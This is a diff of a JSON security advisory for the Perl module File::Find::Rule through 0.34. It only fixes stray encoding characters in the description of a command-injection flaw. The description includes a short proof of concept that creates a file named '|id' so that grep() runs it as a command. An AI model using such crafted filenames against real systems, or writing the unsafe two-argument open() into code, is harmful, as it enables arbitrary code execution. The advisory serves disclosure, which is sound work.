@@ -12,7 +12,7 @@
       "notes": [
          {
             "category": "description",
-            "text": "File::Find::Rule through 0.34 for Perl is vulnerable to Arbitrary Code Execution when `grep()` encounters a crafted filename.  A file handle is opened with the 2 argument form of `open()` allowing an attacker controlled filename to provide the MODE parameter to `open()`, turning the filename into a command to be executed.  Example:  $ mkdir /tmp/poc; echo > \"/tmp/poc/|id\" $ perl -MFile::Find::Rule \\ Â  Â  -E 'File::Find::Rule->grep(\"foo\")->in(\"/tmp/poc\")' uid=1000(user) gid=1000(user) groups=1000(user),100(users)",
+            "text": "File::Find::Rule through 0.34 for Perl is vulnerable to Arbitrary Code Execution when `grep()` encounters a crafted filename.  A file handle is opened with the 2 argument form of `open()` allowing an attacker controlled filename to provide the MODE parameter to `open()`, turning the filename into a command to be executed.  Example:  $ mkdir /tmp/poc; echo > \"/tmp/poc/|id\" $ perl -MFile::Find::Rule \\     -E 'File::Find::Rule->grep(\"foo\")->in(\"/tmp/poc\")' uid=1000(user) gid=1000(user) groups=1000(user),100(users)",
             "title": "Vulnerability Description"
          }
       ],
